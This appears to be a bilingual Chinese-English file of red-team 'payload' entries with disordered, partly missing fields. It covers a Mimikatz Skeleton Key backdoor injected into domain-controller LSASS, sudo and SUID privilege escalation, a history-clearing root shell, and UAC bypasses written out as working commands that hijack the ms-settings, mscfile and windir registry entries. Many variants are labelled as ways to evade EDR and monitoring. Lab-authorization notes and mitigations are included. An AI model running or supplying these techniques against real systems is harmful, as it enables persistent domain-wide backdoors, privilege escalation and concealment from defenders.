analysis.en: Service Persistence Configuration Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

review.rationale: N-0020 C3 回填 sc start evilsvc 触发命令（=execution 步2）。

name.zh: Skeleton Key 万能口令注入

description.zh: 向域控 LSASS 注入 Skeleton Key 万能口令，辅以 lsass 进程基线核对，验证域控完整性监控盲区。
description.en: Inject a Skeleton Key master password into the DC LSASS process, with lsass process baseline checks, verifying domain-controller integrity monitoring blind spots.

prerequisites.zh: 确认 Skeleton Key 域控完整性审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Skeleton Key Domain-Controller Integrity Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

description.zh: 用 Mimikatz 植入 Skeleton Key；misc::skeleton 返回植入成功提示即主密码已注入 LSASS，默认万能口令为 mimikatz，任一域账户搭配该口令完成域认证即验证成功。
description.en: Implant the Skeleton Key with Mimikatz; misc::skeleton reporting success means the master password is injected into LSASS.

title.zh: 查看 LSASS 进程基线信息

description.zh: 读取 LSASS 进程 ID、启动时间与路径，为 Skeleton Key 植入前后提供进程对照基线。
description.en: Reads the LSASS process ID, start time, and path to provide a process baseline for before-and-after Skeleton Key implantation.

title.zh: 核对 LSASS 进程存活状态

description.zh: 列出 LSASS 进程以确认 Skeleton Key 植入操作期间进程未中断。
description.en: Lists the LSASS process to confirm it stayed alive during Skeleton Key implantation.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避 mimikatz.exe 落盘与进程特征：PowerShell 内存执行注入骨架密钥；用任意口令通过域认证即成功。
description.en: Inject the skeleton key from memory via PowerShell to avoid on-disk mimikatz signatures; domain auth succeeding with any password confirms success.

description.zh: 以 .NET 内联方式在代理进程内执行：无独立工具进程；注入后 mimikatz 口令可登录即成功。
description.en: Run the .NET variant in-process with no standalone tool process; the default skeleton password authenticating afterwards confirms success.

description.zh: 操作机不落工具，远程 WMI 在域控触发；进程创建返回 PID 且骨架口令可登录即成功。
description.en: Trigger remotely via WMI keeping the operator host clean; a returned PID plus working skeleton password confirms success.

description.zh: 在域控以 mimikatz 的 misc::skeleton 向 LSASS 注入主密码；返回成功提示即域内任意账户都可用该密码完成域认证。
description.en: On the DC run misc::skeleton to inject the master password into LSASS; success means every domain account now authenticates with it.

title.zh: 留存 LSASS 进程信息

description.zh: 读取 LSASS 进程的编号、启动时间与可执行路径；记录植入时刻的进程参数，用于判断域控重启后后门是否失效。
description.en: Read LSASS's PID, start time and path; anchoring the process state at injection time tells whether a reboot kills the backdoor.

title.zh: 核对进程存活与后门可用
title.en: Confirm process survival and backdoor use

description.zh: 再次列出 LSASS 进程确认未发生重启；主密码仍可登录任意账户即 Skeleton Key 持续生效，形成全域认证后门。
description.en: List LSASS again to confirm no restart; the master password still authenticating any account means the domain-wide backdoor holds.

overview.zh: 该 Payload 覆盖 Skeleton Key 域控完整性审计场景，检验 LSASS 主口令植入的可能性与进程对照方法。验证维度含 Skeleton Key 植入、LSASS 基线采集与存活核对三步，对应第 1 至第 3 步。
overview.en: This payload covers Skeleton Key domain-controller integrity auditing, testing LSASS master-password implant feasibility and process-comparison methods. Validation covers Skeleton Key implantation, LSASS baseline capture and liveness verification, mapped to steps 1 through 3.

vulnerability.zh: 根因在于可对域控执行代码的攻击者能向 LSASS 注入口令过滤补丁：任意账户随后可用万能口令认证，域内全部身份校验被静默架空且重启即消失。
vulnerability.en: The root cause is code execution on a domain controller enabling LSASS password-filter patching: any account then authenticates with a master password, silently voiding all domain identity checks until reboot.

exploitation.zh: 第 1 步在域控以 mimikatz 执行 misc::skeleton，植入成功提示即主口令注入 LSASS，随后用任一账户加万能口令验证认证；第 2 步采集 LSASS 进程 ID、启动时间与路径形成基线；第 3 步复核 LSASS 存活状态，确认植入期间进程未中断并记录对照。以万能口令认证成功为成功判据。占位符在全局变量菜单替换；仅在授权实验域执行，测试后重启域控清除。
exploitation.en: In step 1, run mimikatz misc::skeleton on the domain controller; the implant-success notice means the master password is injected into LSASS, then authenticate with any account plus the master password to verify. In step 2, capture LSASS PID, start time and path as a baseline. In step 3, recheck LSASS liveness to confirm the process stayed intact during implantation, recording the comparison. Judge success by master-password authentication succeeding. Replace placeholders via the global variables menu; run only in the authorized lab domain and reboot the DC afterwards to clear it.

mitigation.zh:
收敛域控交互与远程登录来源，RunAsPPL+Credential Guard 保护 LSASS，监控口令过滤器 DLL 加载：
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
mitigation.en: Restrict domain-controller logon sources and enable Credential Guard, monitoring LSASS integrity and password-filter DLL loads. After the fix, replay step 1: injection should be blocked with a highest-severity alert.

analysis.zh: Skeleton Key 域控完整性审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Skeleton Key Domain-Controller Integrity Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

review.rationale: N-0020 C1 回填 misc::skeleton 植入命令；N-0023 步1 剥 mimikatz # 提示符（链 C1 同步）。

description.zh: 以 sudo -l 列出授权；root NOPASSWD 条目即锁定免密提权命令。

title.zh: 列出当前用户 sudo 授权

title.zh: 规避变体：CVE-2019-14287 用户号绕过

description.zh: 规避点：sudo<1.8.28 以 #uid=-1 语法绕过用户白名单。判据：直接得到 root shell。
description.en: Exploits the -1 uid parsing to bypass allowlists on old sudo. Success: root shell.

title.zh: 规避变体：env 链式提权

description.zh: 规避点：sudoers 授权 env 时以环境执行器转 shell，命令行无 vim/find 特征。判据：root shell。
description.en: env is allowed, spawns a shell without classic GTFOBins signatures. Success: root shell.

title.zh: 规避变体：less 读密 + shell

description.zh: 规避点：以阅读密文件为掩护进入 pager 后执行 !sh。判据：显示哈希并得到 shell。
description.en: Reading shadow as cover, then !sh inside the pager. Success: hashes shown and shell obtained.

title.zh: 规避变体：静默授权探测

description.zh: 规避点：-n 免密码提示、管道过滤减少输出曝光。判据：列出可免密命令。
description.en: Non-interactive probe with filtered output. Success: passwordless commands listed.

description.zh: 用 sudo -l 列出当前用户全部授权；出现 root 且 NOPASSWD 的命令即锁定可滥用的提权入口，重点关注带通配符或编辑器的条目。
description.en: List grants with sudo -l; root NOPASSWD entries mark the abusable escalation doors, especially wildcards and editors.

description.zh: 用 sudo -n -l 在脚本环境复核免密授权清单；输出完整命令与参数限制即可判断是否存在参数注入或 shell 逃逸空间。
description.en: Re-check with sudo -n -l inside scripts; the full command and argument constraints reveal room for argument injection or shell escapes.

description.zh: 对 vim、find、awk 等授权程序运行已知逃逸语法；获得 root shell 即完成 sudo 提权闭环，可继续横向或读取敏感文件。
description.en: Run known escapes against granted vim, find and awk; a root shell closes the sudo escalation loop for further movement.

overview.zh: 该 Payload 覆盖 Sudoers 最小权限审计场景，检验当前用户 NOPASSWD 授权项的可滥用逃逸面。验证维度含授权枚举、常见程序逃逸与非交互核对三步，对应第 1 至第 3 步。
overview.en: This payload covers sudoers least-privilege auditing, testing escape surfaces of the current user's NOPASSWD grants. Validation covers grant enumeration, common-program escapes and non-interactive verification, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 sudoers 为编辑器、查找类工具授予无限制 root 权限：这类程序自带 shell 逃逸，用户免密即可获得完整 root 会话，最小权限原则失效。
vulnerability.en: The root cause is sudoers granting unrestricted root to editors and search-class tools with built-in shell escapes: users get a full root session passwordlessly, voiding least privilege.

exploitation.zh: 第 1 步以 sudo -l 列出当前授权，锁定 NOPASSWD 条目；第 2 步按脚本对 vim、find、awk 等授权程序逐一执行已知逃逸，取得 root Shell 即确认对应路径；第 3 步以 sudo -n -l 非交互模式复核清单以支撑自动化巡检。以 root 身份回显为成功判据。占位符在全局变量菜单替换；逃逸验证仅执行 id 等只读命令。
exploitation.en: In step 1, list current grants with sudo -l and lock onto NOPASSWD entries. In step 2, run known escapes for authorized programs such as vim, find and awk per the script; a root shell confirms the path. In step 3, recheck the list non-interactively with sudo -n -l to support automated audits. Judge success by root-identity output. Replace placeholders via the global variables menu; run read-only commands like id during escape verification.

mitigation.zh:
sudoers 收敛为命令+参数白名单，禁止编辑器/查找类工具全权授权，开启输入输出日志与会话录制：
    Cmnd_Alias OPS = /usr/bin/systemctl restart nginx, /usr/bin/cat /var/log/app/*
    dev ALL=(root) NOPASSWD: OPS
    Defaults log_input, log_output, iolog_dir=/var/log/sudo-io/%{user}
    visudo -cf /etc/sudoers
mitigation.en: Narrow sudoers to argument allowlists, forbid blanket editor-class grants, and enable sudo logging with session recording. After the fix, replay step 2: escape attempts should be denied with traceable logs.

analysis.zh: Sudoers 最小权限审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Sudoers Least-Privilege Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

name.zh: SUID 文件权限边界审计

description.zh: 查找全盘 SUID 文件；输出 root 属主的非常规 SUID 程序清单即锁定提权候选。

description.zh: 对候选程序逐一验证已知利用；拿到 root shell 即确认对应 SUID 提权路径。

title.zh: 枚举 SUID 二进制文件

title.zh: 规避变体：解释器提权替代

description.zh: 规避点：SUID python 路径替代 find/vim 等高频告警二进制。判据：得到 root shell。
description.en: Uses a SUID python instead of noisy find/vim paths. Success: root shell.

title.zh: 规避变体：perl 提权路径

description.zh: 规避点：SUID perl 变体扩大绕过面。判据：euid 为 0。失效条件：现代 perl 检测到 setuid/euid≠ruid 直接拒绝执行（suidperl 已移除多年），「euid 为 0」仅在历史发行版成立。
description.en: SUID perl variant widens coverage. Success: euid 0.Failure condition: modern perl detects setuid with euid differing from ruid and refuses to run (suidperl was removed years ago), so the euid-0 criterion holds only on historical distributions.

title.zh: 规避变体：无痕 shell 环境

exec /bin/sh -p
unset HISTFILE HISTSIZE; export HISTSIZE=0; history -c

description.zh: 规避点：exec 替换进程避免父子树检测并清历史。判据：无 history 记录且 shell 可用。
description.en: exec replaces the process tree and clears history. Success: shell works with no history records.

title.zh: 全盘枚举 SUID 文件

description.zh: 用 find 按 -perm -4000 扫描全盘可执行文件；输出 root 属主且非常规路径的 SUID 程序清单即锁定提权候选集合。
description.en: Scan the filesystem with find -perm -4000; root-owned SUID binaries outside the usual directories form the escalation shortlist.

title.en: Refine the hunt in standard directories

description.zh: 限定 /usr/bin 与 /usr/local/bin 精确列出 SUID 二进制；逐条与 GTFOBins 匹配圈定带已知利用方式的程序，缩小攻击面。
description.en: List SUID binaries precisely under /usr/bin and /usr/local/bin and match each against GTFOBins; known-abusable programs shrink the target list.

title.zh: 利用 SUID 逃逸拿 root shell
title.en: Escape to a root shell via SUID

description.zh: 对候选程序运行 nmap 交互模式、vim 的 bang 命令、find 的 exec 参数等已知逃逸语法；获得 euid 为 root 的 shell 即完成提权。

overview.zh: 该 Payload 覆盖 SUID 文件权限边界审计场景，检验 root 属主 SUID 程序的可滥用面。验证维度含全盘定位、常见程序逃逸验证与受限目录枚举三步，对应第 1 至第 3 步。
overview.en: This payload covers SUID file-permission boundary auditing, testing the abusable surface of root-owned SUID programs. Validation covers full-disk discovery, known-escape verification and restricted-directory enumeration, mapped to steps 1 through 3.

vulnerability.zh: 根因在于非常规程序被赋予 SUID 位或管理员对交互式工具授权失当：具备 shell 逃逸能力的 SUID 程序被普通用户调用时直接以 root 执行任意命令。
vulnerability.en: The root cause is unusual binaries carrying the SUID bit or admin misgranting interactive tools: SUID programs with shell escapes execute arbitrary commands as root when invoked by standard users.

exploitation.zh: 第 1 步用 find 全盘定位 SUID 文件，锁定 root 属主且不在基线清单的候选；第 2 步按脚本对 nmap、vim、find 等已知逃逸程序逐一验证，取得 root Shell 即确认对应路径；第 3 步对 usr 目录受限范围再次枚举并输出前 50 项用于交叉核对。以 root 身份回显为成功判据。占位符在全局变量菜单替换；测试 Shell 仅执行只读命令。
exploitation.en: In step 1, locate SUID files disk-wide with find, locking onto root-owned candidates absent from the baseline list. In step 2, verify known escapes for nmap, vim and find per the script; a root shell confirms the corresponding path. In step 3, re-enumerate within usr directories and print the first 50 entries for cross-checking. Judge success by root-identity output. Replace placeholders via the global variables menu; run read-only commands in test shells.

mitigation.zh:
移除非必要 SUID 位并基线比对监控变更，用户可写分区 nosuid 挂载，交互式工具一律不授权 SUID：
    find / -perm -4000 -type f -printf '%m %u %p\n' | sort > /root/suid.baseline
    chmod u-s /usr/bin/nmap /usr/bin/vim /usr/bin/find
    echo '/home ext4 defaults,nosuid 0 2' >> /etc/fstab
    mount -o remount,nosuid /home
mitigation.en: Strip unneeded SUID bits, monitor changes against a baseline, and mount user-writable partitions nosuid. After the fix, replay steps 1 and 2: stray bits should be gone and escapes fail.

prerequisites.zh: 确认 UAC 策略与自动提升边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for UAC Policy and Auto-Elevation Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

description.zh: 用 UACME 执行指定绕过方法；目标进程以管理员令牌运行即确认对应方法有效。

opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

wafBypass.command:
reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "cmd.exe" /f
reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /d "" /f
computerdefaults.exe

description.zh: 规避点：换自动提权入口 computerdefaults.exe，避免 fodhelper 进程监控；保留 DelegateExecute 空值是提权生效关键。判据：弹出管理员 CMD。
description.en: Different auto-elevate binary avoids fodhelper monitoring; the empty DelegateExecute is required. Success: elevated CMD opens.

title.zh: 规避变体：劫持键即时回滚

wafBypass.command:
reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "cmd /c whoami > C:\\Windows\\temp\\u.txt" /f
eventvwr.exe
reg delete HKCU\\Software\\Classes\\mscfile /f

description.zh: 规避点：提权后立刻删除劫持键，缩短注册表监控窗口。判据：u.txt 生成且 mscfile 键已不存在。
description.en: Deletes the hijack key right after elevation to shrink the monitoring window. Success: u.txt created and key removed.

title.zh: 规避变体：uacMe 方法号轮换

description.zh: 规避点：切换 uacMe 方法号（23→61）绕过针对单一方法的 EDR 规则。判据：以高完整性启动 cmd。
description.en: Rotating the uacMe method index evades single-method EDR rules. Success: cmd starts high-integrity.

title.zh: 规避变体：无文件式环境变量劫持

wafBypass.command:
reg add "HKCU\Environment" /v windir /t REG_EXPAND_SZ /d "cmd /c whoami" /f 
 schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /i

description.zh: 规避点：SilentCleanup 以系统权限读取 HKCU\Environment 的 windir，全程无 dropper 文件。判据：任务执行后出现 SYSTEM 输出。
description.en: SilentCleanup reads the hijacked windir at SYSTEM with no dropped files. Success: SYSTEM output appears.

explanation.zh: 劫持用户环境变量 windir

title.zh: 劫持 ms-settings 注册表键

description.zh: 写入 HKCU 下 ms-settings 的打开命令键并置空 DelegateExecute，再启动 fodhelper.exe；绑定命令以高完整性执行即无弹窗绕过 UAC。

description.en: Run Akagi64 with method 23; an admin token on the spawned process proves a working bypass on the current patch level, and other indices widen the sweep.

overview.zh: 该 Payload 覆盖 UAC 策略与自动提升边界审计场景，检验管理员批准模式下自动提升接口的可劫持面。验证维度含 fodhelper、eventvwr 两类注册表劫持与 UACME 方法库调用，对应第 1 至第 3 步。
overview.en: This payload covers UAC policy and auto-elevate boundary auditing, testing the hijackable surface of auto-elevating interfaces under admin-approval mode. Validation covers fodhelper and eventvwr registry hijacks plus UACME method invocation, mapped to steps 1 through 3.

vulnerability.zh: 根因在于部分自动提升二进制按注册表类键定位处理程序且不校验完整性级别：普通用户改写 HKCU 对应键后调用系统工具，即可让命令以高完整性执行。
vulnerability.en: The root cause is some auto-elevating binaries resolving handlers via registry class keys without integrity checks: a standard user rewrites the HKCU key and invokes the system tool, executing a command at high integrity.

exploitation.zh: 第 1 步写入 ms-settings 的 Shell Open command 键并运行 fodhelper，绑定命令以高完整性执行即确认自动提升绕过；第 2 步对 mscfile 键做同样写入并运行 eventvwr 复测第二条路径；第 3 步用 UACME 的 Akagi64 调用编号方法验证库内其他绕过面。以进程完整性级别为成功判据。占位符在全局变量菜单替换；测试后清理全部劫持键。
exploitation.en: In step 1, write the ms-settings Shell Open command key and run fodhelper; the bound command executing at high integrity confirms the auto-elevate bypass. In step 2, repeat with the mscfile key and eventvwr to retest the second path. In step 3, invoke numbered methods with UACME's Akagi64 to verify other library bypasses. Judge success by process integrity level. Replace placeholders via the global variables menu; clean up all hijack keys after testing.

mitigation.zh:
UAC 调至最高并对自动提升程序启用安装程序检测，监控 HKCU 类键写入与 fodhelper/eventvwr 调用链：
    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f
    <RegistryEvent onmatch="include"><TargetObject condition="begin with">HKCU\Software\Classes\ms-settings</TargetObject></RegistryEvent>
    修复后重放第 1 至第 3 步，全部方法应失败并触发告警。
mitigation.en: Raise UAC to maximum with installer detection for auto-elevating programs, monitoring HKCU class-key writes and anomalous fodhelper and eventvwr call chains. After the fix, replay steps 1 through 3: every method should fail with alerts.

analysis.zh: UAC 策略与自动提升边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: UAC Policy and Auto-Elevation Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

review.rationale: N-0020 C1 回填 fodhelper ms-settings 劫持命令（=execution 步1）。
